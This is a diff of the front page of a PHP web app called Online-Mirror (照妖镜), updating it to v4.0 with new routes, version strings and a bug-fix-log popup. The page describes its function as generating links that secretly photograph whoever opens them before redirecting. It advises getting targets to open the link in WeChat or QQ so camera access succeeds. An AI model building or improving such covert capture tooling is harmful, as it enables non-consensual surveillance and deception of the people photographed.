@@ -1,6 +1,6 @@
 <?php
 /**
- * Online-Mirror v3.0 - 主页面
+ * Online-Mirror v4.0 - 主页面
  * 支持双重模式：链接生成器 & 拍照入口
  */
 ini_set('session.cookie_lifetime', 2592000);
@@ -9,7 +9,7 @@ session_start();
 // ========== 🚀 安装检测 ==========
 // 如果未安装，自动跳转到安装向导
 if (!file_exists(__DIR__ . '/installed.lock')) {
-    header('Location: install.php');
+    header('Location: install');
     exit;
 }
 
@@ -51,8 +51,6 @@ if (isIPBanned()) {
         $remaining = max(0, 86400 - (time() - strtotime($ban_info['created_at'])));
     }
     die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center;animation:fadeInUp 0.5s ease-out}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:24px;color:#ff6b6b;margin:0 0 4px}.card .sub{color:#8080a0;font-size:13px;line-height:1.6;margin:0}.card .reason{color:#a0a0b8;font-size:15px;line-height:1.6;margin:16px 0 0;padding:12px 16px;background:rgba(255,80,80,0.08);border-radius:12px;border:1px solid rgba(255,80,80,0.12)}.countdown-wrap{margin-top:20px;padding:16px;background:rgba(102,126,234,0.08);border:1px solid rgba(102,126,234,0.15);border-radius:14px}.countdown-wrap .label{font-size:12px;color:#8080a0;margin-bottom:6px}.countdown-wrap .timer{font-size:28px;font-weight:700;font-family:monospace;color:#667eea;letter-spacing:2px;animation:pulse 2s ease-in-out infinite}.countdown-wrap .hint{font-size:11px;color:#606080;margin-top:6px}</style>
-<!-- ====== 🎬 
-
 </head><body><div class="card"><div class="icon">🚫</div><h1>拒绝访问</h1><p class="sub">您的请求已被系统拒绝</p><p class="reason">' . $ban_reason . '</p>' . ($is_system ? '<div class="countdown-wrap"><div class="label">⏳ 自动解封倒计时</div><div class="timer" id="countdown">' . sprintf('%02d:%02d:%02d', floor($remaining/3600), floor(($remaining%3600)/60), $remaining%60) . '</div><div class="hint">封禁到期后将自动刷新</div></div><script>var r=' . $remaining . ';!function t(){if(r<=0)location.reload();else{var e=document.getElementById("countdown");e&&(e.textContent=String(Math.floor(r/3600)).padStart(2,"0")+":"+String(Math.floor(r%3600/60)).padStart(2,"0")+":"+String(r%60).padStart(2,"0")),r--,setTimeout(t,1000)}}()</script>' : '') . '</div></body></html>');
 }
 
@@ -63,7 +61,7 @@ if (isset($_GET['id']) && isset($_GET['url'])) {
     $id = trim($_GET['id']);
     $url = trim($_GET['url']);
     if (!empty($id) && !empty($url)) {
-        header('Location: capture.php?id=' . urlencode($id) . '&url=' . urlencode($url));
+        header('Location: /capture/' . urlencode($id) . '?url=' . urlencode($url));
         exit;
     }
 }
@@ -657,6 +655,206 @@ body {
 .toast { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
 </style>
 
+<!-- ====== 🩹 修复日志弹窗样式 ====== -->
+<style>
+/* 修复日志按钮 */
+.footer .social-links a.log-btn {
+    background:rgba(255,107,107,0.08);
+    border-color:rgba(255,107,107,0.18);
+    color:#ff7e7e;
+    position:relative;
+    overflow:hidden;
+}
+.footer .social-links a.log-btn::before {
+    content:'';
+    position:absolute;
+    top:-50%; left:-50%;
+    width:200%; height:200%;
+    background:conic-gradient(transparent, rgba(255,107,107,0.08), transparent 30%);
+    animation:logRotate 6s linear infinite;
+}
+@keyframes logRotate {
+    to { transform:rotate(360deg); }
+}
+.footer .social-links a.log-btn span {
+    position:relative;
+    z-index:1;
+}
+.footer .social-links a.log-btn:hover {
+    background:rgba(255,107,107,0.18);
+    border-color:rgba(255,107,107,0.35);
+    color:#ff9999;
+    transform:translateY(-2px);
+}
+
+/* 修复日志弹窗 */
+.log-modal {
+    display:none;
+    position:fixed; top:0; left:0; right:0; bottom:0;
+    z-index:99999; background:rgba(0,0,0,0.88);
+    justify-content:center; align-items:center;
+    backdrop-filter:blur(6px);
+}
+.log-modal.show { display:flex; }
+.log-modal .log-box {
+    background:#151528;
+    border:1px solid rgba(255,255,255,0.1);
+    border-radius:20px;
+    width:92vw; max-width:680px;
+    max-height:85vh;
+    display:flex; flex-direction:column;
+    animation:fadeInUp 0.35s ease-out;
+    box-shadow:0 20px 60px rgba(0,0,0,0.5);
+}
+.log-modal .log-header {
+    padding:16px 24px;
+    display:flex; align-items:center; justify-content:space-between;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+    flex-shrink:0;
+}
+.log-modal .log-header h3 {
+    font-size:17px;
+    display:flex; align-items:center; gap:8px;
+}
+.log-modal .log-header h3 .badge-new {
+    font-size:10px;
+    background:rgba(255,107,107,0.2);
+    color:#ff7e7e;
+    padding:2px 8px;
+    border-radius:6px;
+    animation:pulse 2s ease-in-out infinite;
+}
+.log-modal .log-close {
+    width:32px; height:32px;
+    display:flex; align-items:center; justify-content:center;
+    border:none; border-radius:10px;
+    background:rgba(255,255,255,0.06);
+    color:#8080a0; font-size:14px;
+    cursor:pointer; transition:all 0.3s;
+}
+.log-modal .log-close:hover {
+    background:rgba(255,80,80,0.15);
+    color:#ff6b6b;
+    transform:rotate(90deg);
+}
+.log-modal .log-body {
+    padding:20px 24px;
+    overflow-y:auto;
+    flex:1;
+    font-size:13px;
+    line-height:1.8;
+    color:#c0c0d0;
+}
+.log-modal .log-body::-webkit-scrollbar {
+    width:5px;
+}
+.log-modal .log-body::-webkit-scrollbar-track {
+    background:transparent;
+}
+.log-modal .log-body::-webkit-scrollbar-thumb {
+    background:rgba(255,255,255,0.08);
+    border-radius:3px;
+}
+.log-modal .log-body::-webkit-scrollbar-thumb:hover {
+    background:rgba(255,255,255,0.15);
+}
+
+/* 修复日志内容样式 */
+.log-body .log-title {
+    font-size:22px;
+    font-weight:700;
+    background:linear-gradient(135deg,#667eea,#764ba2);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+    margin-bottom:16px;
+}
+.log-body .log-version {
+    font-size:13px;
+    color:#667eea;
+    font-weight:600;
+    margin-top:20px;
+    margin-bottom:8px;
+    padding-bottom:6px;
+    border-bottom:1px solid rgba(102,126,234,0.15);
+}
+.log-body .log-bug {
+    margin:8px 0;
+    padding:12px 16px;
+    background:rgba(255,255,255,0.03);
+    border-left:3px solid #667eea;
+    border-radius:0 8px 8px 0;
+}
+.log-body .log-bug.critical {
+    border-left-color:#ff6b6b;
+}
+.log-body .log-bug.medium {
+    border-left-color:#ff9800;
+}
+.log-body .log-bug .log-level {
+    font-size:10px;
+    padding:1px 6px;
+    border-radius:3px;
+    margin-right:6px;
+}
+.log-body .log-bug .log-level.critical {
+    background:rgba(255,80,80,0.15);
+    color:#ff6b6b;
+}
+.log-body .log-bug .log-level.medium {
+    background:rgba(255,152,0,0.15);
+    color:#ff9800;
+}
+.log-body .log-bug h4 {
+    font-size:14px;
+    margin:4px 0;
+    color:#e0e0e0;
+}
+.log-body .log-bug p {
+    margin:4px 0;
+    color:#a0a0b8;
+    font-size:12px;
+}
+.log-body .log-footer-note {
+    margin-top:24px;
+    padding:12px 16px;
+    background:rgba(102,126,234,0.06);
+    border-radius:10px;
+    text-align:center;
+    font-size:12px;
+    color:#8080a0;
+}
+.log-body .log-footer-note a {
+    color:#667eea;
+    text-decoration:none;
+}
+.log-body .log-footer-note a:hover {
+    text-decoration:underline;
+}
+
+/* 加载状态 */
+.log-loading {
+    text-align:center;
+    padding:40px 20px;
+    color:#8080a0;
+}
+.log-loading .spinner {
+    width:32px; height:32px;
+    border:3px solid rgba(102,126,234,0.15);
+    border-top-color:#667eea;
+    border-radius:50%;
+    animation:spin 0.8s linear infinite;
+    margin:0 auto 12px;
+}
+@keyframes spin {
+    to { transform:rotate(360deg); }
+}
+.log-error {
+    text-align:center;
+    padding:40px 20px;
+    color:#ff6b6b;
+}
+</style>
+
 <!-- ====== 🎬 闪屏样式 ====== -->
 <style>
 @keyframes splashFadeIn {
@@ -777,13 +975,13 @@ body {
         <img class="splash-logo" src="<?= htmlspecialchars($splash_image) ?>" alt="照妖镜"
              onerror="this.src='/mirror/splash_default.png'" />
         <div class="splash-title">🔮 照妖镜</div>
-        <div class="splash-sub">3.0</div>
+        <div class="splash-sub">4.0</div>
         <div class="splash-bar-wrap">
             <div class="splash-bar-inner" id="splashBar"></div>
         </div>
         <div class="splash-info">
             <span>✦ 加载中</span>
-            <span>✦ 照妖镜 3.0</span>
+            <span>✦ 照妖镜 4.0</span>
         </div>
         <div class="splash-dots">
             <span></span><span></span><span></span>
@@ -1057,7 +1255,7 @@ body {
             对方打开链接后会自动拍摄一张照片并跳转到指定页面<br>
             <span style="color:#ff9800;font-size:12px;">💡 建议让对方在微信或QQ内打开链接，部分浏览器可能无法获取摄像头权限</span>
             <?php if (isLoggedIn()): ?>
-                <br><a href="dashboard.php" style="color:#667eea;">👉 前往后台管理</a>
+                <br><a href="admin" style="color:#667eea;">👉 前往后台管理</a>
             <?php endif; ?>
         </div>
         <div class="qrcode-wrap" id="qrcodeWrap" style="margin-top:14px;display:<?php echo ($generated_link && $show_qrcode ? 'block' : 'none'); ?>;">
@@ -1088,13 +1286,19 @@ body {
                 <i class="fab fa-github"></i> GitHub
             </a>
             <a href="https://gitee.com/beihaiLG/online-mirror" target="_blank" rel="noopener">
-                <i class="fab fa-git-alt"></i> Gitee
+                <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z" opacity="0"/><path d="M12 2a10 10 0 110 20 10 10 0 010-20zm1.5 5.5h-3a.75.75 0 00-.75.75v7.5c0 .414.336.75.75.75h3a.75.75 0 00.75-.75v-7.5a.75.75 0 00-.75-.75zM12 16.5a1.5 1.5 0 110 3 1.5 1.5 0 010-3z"/></svg>
+                Gitee
             </a>
+        </div>
+        <div class="social-links" style="margin-top:6px;">
             <a href="javascript:void(0)" class="dev-btn" onclick="showDeveloper()">
                 <i class="fas fa-code"></i> 开发者
             </a>
             <a href="javascript:void(0)" class="dev-btn" onclick="showDonation()" style="background:rgba(255,193,7,0.12);border-color:rgba(255,193,7,0.2);color:#ffc107;">
                 <i class="fas fa-coffee"></i> 打赏
+            </a>
+            <a href="javascript:void(0)" class="log-btn" onclick="showFixLog()" title="查看所有修复记录">
+                <span><i class="fas fa-bandage"></i> 修复日志</span>
             </a>
         </div>
         <div style="margin-top:10px;font-size:12px;color:#606080;">
@@ -1106,11 +1310,11 @@ body {
         <?php if (isLoggedIn()): ?>
             <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
             <span class="divider">|</span>
-            <a href="dashboard.php"><i class="fas fa-tachometer-alt"></i> 控制台</a>
+            <a href="admin"><i class="fas fa-tachometer-alt"></i> 控制台</a>
             <span class="divider">|</span>
-            <a href="login.php?action=logout"><i class="fas fa-sign-out-alt"></i> 退出</a>
+            <a href="logout"><i class="fas fa-sign-out-alt"></i> 退出</a>
         <?php else: ?>
-            <a href="login.php"><i class="fas fa-lock"></i> 管理员登录</a>
+            <a href='/login'><i class="fas fa-lock"></i> 管理员登录</a>
         <?php endif; ?>
         </div>
     </div>
@@ -1519,7 +1723,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-// ========== v3.0 历史记录 (localStorage) ==========
+// ========== v4.0 历史记录 (localStorage) ==========
 function saveHistory(id, link) {
     try {
         var history = JSON.parse(localStorage.getItem('mirror_history') || '[]');
@@ -1710,7 +1914,7 @@ function toggleField(type) {
         <?php endif; ?>
     }
     
-    // v3.0 AI & 反向图搜特殊处理
+    // v4.0 AI & 反向图搜特殊处理
     if (type === 'ai') {
         var aiInput = document.getElementById('aiEnabledInput');
         if (aiInput) aiInput.value = btn.classList.contains('on') ? '1' : '0';
@@ -1732,7 +1936,7 @@ function toggleField(type) {
     }
 }
 
-// v3.0 AI默认开，但如果管理员没配key则强制关
+// v4.0 AI默认开，但如果管理员没配key则强制关
 <?php if (empty(getSetting('ai_api_key'))): ?>
 document.addEventListener('DOMContentLoaded', function() {
     var aiBtn = document.getElementById('toggleAiBtn');
@@ -1869,6 +2073,142 @@ function checkScComplete() {
         fill.style.width = '0';
         text.textContent = '请按住滑块拖动到最右侧';
     }
+}
+</script>
+
+<!-- ====== 🩹 修复日志弹窗 ====== -->
+<div class="log-modal" id="fixLogModal">
+    <div class="log-box">
+        <div class="log-header">
+            <h3>
+                <i class="fas fa-bandage" style="color:#ff7e7e;"></i>
+                修复日志
+                <span class="badge-new">v3.2.1</span>
+            </h3>
+            <button class="log-close" onclick="closeFixLog()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="log-body" id="fixLogBody">
+            <div class="log-loading">
+                <div class="spinner"></div>
+                <div>正在加载修复日志...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ====== 🩹 修复日志 ======
+function showFixLog() {
+    var modal = document.getElementById('fixLogModal');
+    var body = document.getElementById('fixLogBody');
+    modal.classList.add('show');
+    
+    // 加载日志内容（从本地文件读取）
+    body.innerHTML = '<div class="log-loading"><div class="spinner"></div><div>正在加载修复日志...</div></div>';
+    
+    fetch('BUGFIX_LOG.md?v=' + Date.now())
+        .then(function(r) {
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            return r.text();
+        })
+        .then(function(md) {
+            body.innerHTML = renderFixLog(md);
+        })
+        .catch(function() {
+            // 失败时显示备用信息
+            body.innerHTML = '<div class="log-error"><i class="fas fa-exclamation-triangle"></i><br><br>加载失败<br><a href="BUGFIX_LOG.md" target="_blank" style="color:#667eea;">直接查看 BUGFIX_LOG.md</a></div>';
+        });
+}
+
+function closeFixLog() {
+    document.getElementById('fixLogModal').classList.remove('show');
+}
+
+// 点击遮罩关闭
+var fixLogModal = document.getElementById('fixLogModal');
+if (fixLogModal) {
+    fixLogModal.addEventListener('click', function(e) {
+        if (e.target === fixLogModal) closeFixLog();
+    });
+}
+
+// ESC 关闭
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeFixLog();
+});
+
+function renderFixLog(md) {
+    var html = '<div class="log-title"><i class="fas fa-notes-medical"></i> 🐛 修复记录</div>';
+    
+    // 按版本分割
+    var versions = md.split(/^##\s+/m);
+    
+    for (var i = 0; i < versions.length; i++) {
+        var v = versions[i].trim();
+        if (!v || v.indexOf('v') !== 0) continue;
+        
+        // 提取版本标题行
+        var lines = v.split('\n');
+        var titleLine = lines[0] || '';
+        lines.shift();
+        var content = lines.join('\n').trim();
+        
+        html += '<div class="log-version">' + titleLine + '</div>';
+        
+        // 解析 bug 条目
+        var bugs = content.split(/^###\s+/m);
+        for (var j = 0; j < bugs.length; j++) {
+            var bug = bugs[j].trim();
+            if (!bug || bug.indexOf('Bug') !== 0) {
+                // 普通文本，直接渲染
+                html += '<p style="color:#a0a0b8;font-size:12px;line-height:1.6;margin:4px 0;">' + escapeHtml(bug) + '</p>';
+                continue;
+            }
+            
+            var bLines = bug.split('\n');
+            var bTitle = bLines[0] || '';
+            bLines.shift();
+            var bContent = bLines.join('<br>').trim();
+            
+            var isSev = false;
+            var sevClass = '';
+            if (bTitle.indexOf('严重') !== -1 || bTitle.indexOf('⚠️') !== -1) {
+                sevClass = 'critical';
+                isSev = true;
+            } else if (bTitle.indexOf('⚡') !== -1 || bTitle.indexOf('中等') !== -1) {
+                sevClass = 'medium';
+                isSev = true;
+            }
+            
+            var sevLabel = '';
+            if (sevClass) {
+                var labelText = sevClass === 'critical' ? '⚠️ 严重' : '⚡ 中等';
+                sevLabel = '<span class="log-level ' + sevClass + '">' + labelText + '</span>';
+            }
+            
+            html += '<div class="log-bug ' + sevClass + '">';
+            html += sevLabel + '<h4>' + escapeHtml(bTitle) + '</h4>';
+            html += '<p>' + escapeHtml(bContent.replace(/<br>/g, '\n')).replace(/\n/g, '<br>') + '</p>';
+            html += '</div>';
+        }
+    }
+    
+    html += '<div class="log-footer-note">';
+    html += '<i class="fas fa-external-link-alt"></i> 完整日志：';
+    html += '<a href="https://gitee.com/beihaiLG/online-mirror/blob/master/BUGFIX_LOG.md" target="_blank">Gitee</a>';
+    html += ' · <a href="https://github.com/beihaiBH/Online-Mirror/blob/master/BUGFIX_LOG.md" target="_blank">GitHub</a>';
+    html += '</div>';
+    
+    return html;
+}
+
+function escapeHtml(str) {
+    if (!str) return '';
+    return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
 }
 </script>
 </body>
